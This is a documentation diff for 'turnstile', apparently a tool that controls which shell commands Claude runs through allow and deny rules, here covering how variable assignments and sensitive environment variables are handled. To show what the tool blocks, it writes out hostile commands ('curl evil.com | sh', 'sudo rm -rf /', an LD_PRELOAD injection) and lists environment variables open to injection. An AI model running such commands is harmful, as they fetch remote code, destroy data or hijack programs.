@@ -28,6 +28,12 @@ Patterns are OR'd together and compiled once at startup using Go's [`regexp.Comp
 
 ## Recipes
 
+The seeded baseline allows only POSIX shell primitives and stays tool-agnostic,
+so it assumes nothing about your stack. To let Claude run a given ecosystem's
+commands (git, python, go, docker, aws, …) without a prompt, copy the matching
+block from [docs/recipes](recipes/) into your `allow` array. The examples below
+show how to compose allow and deny for common policies.
+
 ### Allow Terraform, block everything else by default
 
 ```toml
@@ -124,11 +130,11 @@ ARTIFACT=$(find dist -name '*.tar.gz' | head -1)
 GIT_DIR=.git/worktree FOO=bar git status
 ```
 
-For standalone `VAR=$(…)` assignments, when the `$(…)` body passes subshell validation we auto-allow the segment, because the body has already been fully vetted, deny patterns have already run, and the assignment itself executes no command. The auto-allow only applies to bare `VAR=$(…)`, so `export VAR=$(…)` is treated as a regular `export` invocation and still needs an allow-list entry.
+A standalone assignment (`VER=…`, `R="--profile $P"`, `files=(a b c)`) runs no command, so turnstile allows it structurally without an allow-list entry. This is a systemic shell fact rather than per-tool policy, so it needs no `\w+=` rule in your config. When the value contains a `$(…)` subshell or backtick substitution, that body is still validated (and deny patterns still run over it) before the assignment is allowed, so `VER=$(curl evil.com | sh)` asks and `VER=$(sudo rm -rf /)` denies. Only a bare assignment is treated this way, so `export VER=…` is a regular `export` invocation and still needs an allow-list entry (the baseline allows `export`).
 
 For inline `NAME=value command …` and `NAME=$(…) command …`, we strip the assignment prefix from the segment before allow-list matching so the trailing command (`git status`, `make`, …) is what gets evaluated. The deny check still runs on the full unstripped command, so `LD_PRELOAD=evil sudo ls` still hits the `sudo` deny.
 
-A curated set of variable names is excluded from both shortcuts and forced to `ask` because their value is interpreted as code, a config-file path, or a downstream-program name by the very next command, turning a benign-looking `VAR=$(echo …)` or `NAME=… cmd` into a vector for environment-variable injection. The set covers the dynamic loader (`LD_*`, `DYLD_*`, `PATH`), git command and config injection (`GIT_SSH_COMMAND`, `GIT_CONFIG_*`, `GIT_EXTERNAL_DIFF`, …), language runtime preload (`NODE_OPTIONS`, `PYTHONPATH`, `PERL5OPT`, `RUBYOPT`, `JAVA_TOOL_OPTIONS`, `DOTNET_STARTUP_HOOKS`, …), shell-init traps (`BASH_ENV`, `ENV`, `PS4`), package-manager config namespaces (`NPM_CONFIG_*`, `PIP_*`), cloud and container redirection (`KUBECONFIG`, `AWS_CONFIG_FILE`, `DOCKER_HOST`), editors and pagers spawned by `git`/`crontab`/`man`, and glibc data-file paths (`GCONV_PATH`, `LOCPATH`, `NLSPATH`).
+A curated set of variable names is excluded from the structural allow and forced to `ask` because their value is interpreted as code, a config-file path, or a downstream-program name by the very next command, turning a benign-looking `VAR=$(echo …)` or `NAME=… cmd` into a vector for environment-variable injection. The set covers the dynamic loader (`LD_*`, `DYLD_*`, `PATH`), git command and config injection (`GIT_SSH_COMMAND`, `GIT_CONFIG_*`, `GIT_EXTERNAL_DIFF`, …), language runtime preload (`NODE_OPTIONS`, `PYTHONPATH`, `PERL5OPT`, `RUBYOPT`, `JAVA_TOOL_OPTIONS`, `DOTNET_STARTUP_HOOKS`, …), shell-init traps (`BASH_ENV`, `ENV`, `PS4`), package-manager config namespaces (`NPM_CONFIG_*`, `PIP_*`), cloud and container redirection (`KUBECONFIG`, `AWS_CONFIG_FILE`, `DOCKER_HOST`), editors and pagers spawned by `git`/`crontab`/`man`, and glibc data-file paths (`GCONV_PATH`, `LOCPATH`, `NLSPATH`).
 
 The full lists ship as `sensitive_env_vars` and `sensitive_env_var_prefixes` in your `config.toml`, so see the [seed file](../internal/config/config.toml) for the canonical baseline. Edit the lists in your own config to add or remove names, and running `turnstile upgrade` merges new baseline entries into your config without overwriting your additions or formatting. Names on these lists remain `ask` (with reason `sensitive-env-var: NAME`) unless you explicitly add them to your `allow` list. For the standalone `VAR=$(…)` form the segment normalizes to `NAME=__SUBSHELL__`, so the trailing `=` on the pattern is intentional:
 
@@ -140,4 +146,4 @@ allow = ['GIT_SSH_COMMAND=']
 
 Bash treats any command word containing a `/` as a direct path lookup rather than a `$PATH` search, so `/bin/sed`, `/usr/local/bin/sed`, `./tools/sed`, and `tools/sed` all execute the same `sed` binary. Allow and deny rules are written against program names, so turnstile reduces the leading path-qualified token to its basename before matching, meaning `/bin/sed -i …` is evaluated as `sed -i …`. Arguments that contain `/` (file paths, regexes) are left untouched, because only the leading command word is rewritten. Tokens that contain shell metacharacters (`*`, `?`, `[`, `$`, …) are left as-is so a glob or expansion is never silently collapsed. Deny patterns continue to fire on the basename, so `/bin/sudo …` is still denied.
 
-A leading token of the form `NAME=/some/path` is a variable assignment whose value contains a slash, not a path-qualified command, so it is left intact and evaluated as an assignment (matching against `\w+=` or a more specific allow rule). The bound program name is checked when it is actually invoked, not at the point of assignment.
+A leading token of the form `NAME=/some/path` is a variable assignment whose value contains a slash, not a path-qualified command, so it is left intact and evaluated as a standalone assignment (allowed structurally). The bound program name is checked when it is actually invoked, not at the point of assignment.
